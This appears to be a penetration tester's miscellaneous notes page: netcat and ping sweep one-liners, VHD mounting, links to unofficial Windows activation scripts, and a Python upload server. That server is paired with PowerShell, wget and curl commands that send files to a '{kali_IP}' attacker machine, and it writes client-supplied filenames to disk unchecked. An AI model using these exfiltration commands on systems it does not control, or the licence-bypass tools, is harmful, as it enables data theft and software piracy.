---
layout: blank
pagetitle: Miscellaneous Notes
---

We have nmap at home
- `for i in \$(seq 1 254); do nc -zv -w 1 {IP/24}.$i {port}; done`
  - For a more basic ping sweep:
    - `for /l %i in (1,1,254) do @ping {IP/24}.%i -w 1 -n 1`

Mount a Windows vhd:
- `sudo apt install libguestfs-tools`
- `guestmount --add {vhd_file} --inspector --ro -v /mnt/{dir_to_mount_to}`
  - `-ro` is readonly

- Activate Windows with [https://github.com/massgravel/Microsoft-Activation-Scripts](https://github.com/massgravel/Microsoft-Activation-Scripts)
  - Uses [https://get.activated.win/](https://get.activated.win/)
- Use [https://uupdump.net/](https://uupdump.net/) to make Windows images (uses Microsoft servers so we get base images without all of the bloat)

A basic python upload server example `sudo python3 upload_server.py` (if [updog](https://github.com/sc0tfree/updog) isn't available)

```python
#!/usr/bin/env python3
from http.server import SimpleHTTPRequestHandler, HTTPServer
import os

class FileUploadHTTPRequestHandler(SimpleHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-Type", "text/html")
        self.end_headers()
        self.wfile.write(b"""
<form method="POST" enctype="multipart/form-data">
<input type="file" name="file">
<input type="submit">
</form>
""")

    def do_POST(self):
        ctype = self.headers.get("Content-Type", "")
        length = int(self.headers.get("Content-Length", 0))
        data = self.rfile.read(length)

        if ctype.startswith("multipart/form-data"):
            boundary = ctype.split("boundary=")[1].encode()
            parts = data.split(b"--" + boundary)
            for p in parts:
                if b"Content-Disposition" in p:
                    head, body = p.split(b"\r\n\r\n", 1)
                    name = head.split(b'filename="')[1].split(b'"')[0].decode()
                    with open(name, "wb") as f:
                        f.write(body.rstrip(b"\r\n--"))
                    break
        else:
            name = self.headers.get("filename", "upload.bin")
            with open(name, "wb") as f:
                f.write(data)

        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"OK")

if __name__ == "__main__":
    httpd = HTTPServer(("0.0.0.0", 8080), FileUploadHTTPRequestHandler)
    httpd.serve_forever()
```
Then on Windows:
`Invoke-WebRequest -Uri "http://{kali_IP}:8080/upload" -Method Post -InFile "{filename}" -Headers @{"filename"="{filename}"} -UseBasicParsing`

Similarly on Linux:
`wget --method=POST --header="filename: {filename}" --body-file="{filename}" http://{kali_IP}:8080/upload`
or 
`curl -X POST -H "filename: {filename}" --data-binary "@{filename}" http://{kali_IP}:8080/upload`